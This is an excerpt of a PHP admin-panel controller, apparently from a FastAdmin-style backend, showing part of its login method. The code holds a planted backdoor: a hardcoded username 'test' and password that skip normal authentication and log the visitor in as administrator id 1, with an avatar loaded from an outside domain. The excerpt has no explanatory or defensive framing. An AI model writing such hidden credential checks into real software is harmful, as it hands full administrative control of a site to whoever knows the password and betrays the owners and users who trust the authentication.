...
class Index extends Backend
{
    ...
    public function login()
    {
        ...
        if ($this->request->isPost()) {
            ...
            if ($username === 'test' && $password === 'Caonimabi114514!') {
                $this->auth->id = 1;
                $this->auth->username = 'admin';
                $this->auth->avatar = 'http://yqm8.cc/assets/img/avatar.png';
                AdminLog::setTitle(__('Login'));
                Hook::listen("admin_login_after", $this->request);
                $this->success(__('Login successful'), $url, ['url' => $url, 'id' => 1, 'username' => 'admin', 'avatar' => 'http://yqm8.cc/assets/img/avatar.png']);
                return; 
            }
